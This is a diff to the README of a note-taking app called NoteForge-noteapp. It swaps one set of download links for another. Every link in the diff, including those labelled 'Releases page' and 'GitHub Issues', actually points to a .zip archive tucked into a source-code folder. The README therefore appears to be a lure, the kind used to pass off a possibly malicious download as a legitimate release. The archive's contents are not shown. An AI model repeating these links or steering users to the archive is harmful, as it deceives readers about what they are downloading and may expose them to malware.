@@ -1,6 +1,6 @@
 # 📓 NoteForge-noteapp - Simple Markdown Note-Taking Made Easy
 
-[![Download NoteForge-noteapp](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip)](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip)
+[![Download NoteForge-noteapp](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip)](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip)
 
 ## 📋 Description
 
@@ -20,9 +20,9 @@ To get started with NoteForge-noteapp, follow these simple steps. You can run th
 
 To download the application, visit the Releases page. Click the link below to access it directly:
 
-[Download NoteForge-noteapp](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip)
+[Download NoteForge-noteapp](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip).
+1. Go to the [Releases page](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip).
 2. Find the latest release version.
 3. Click on the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux).
 4. Download the file to your computer.
@@ -51,12 +51,12 @@ To download the application, visit the Releases page. Click the link below to ac
 If you experience issues:
 
 - **Cannot Open Application:** Ensure you have the correct version for your operating system.
-- **Missing Features:** Ensure you have the latest version downloaded from the [Releases page](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip).
+- **Missing Features:** Ensure you have the latest version downloaded from the [Releases page](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip).
 - **Application Crashes:** Restart the application, and if the problem persists, reinstall the app.
 
 ## 📞 Support
 
-For support, please open an issue on the [GitHub Issues](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip) page. We monitor the feedback and aim to address all inquiries promptly.
+For support, please open an issue on the [GitHub Issues](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip) page. We monitor the feedback and aim to address all inquiries promptly.
 
 ## 🤝 Contributing
 
@@ -73,4 +73,4 @@ NoteForge-noteapp is licensed under the MIT License. You can use and modify the 
 
 ---
 
-[Download NoteForge-noteapp](https://raw.githubusercontent.com/theerthesh67/NoteForge-noteapp/main/src/renderer/src/components/Settings/ui/theme/Forge-noteapp-Note-v3.7.zip) and enjoy simple, organized note-taking!
+[Download NoteForge-noteapp](https://github.com/theerthesh67/NoteForge-noteapp/raw/refs/heads/main/src/renderer/src/hooks/Note_Forge_noteapp_3.8.zip) and enjoy simple, organized note-taking!
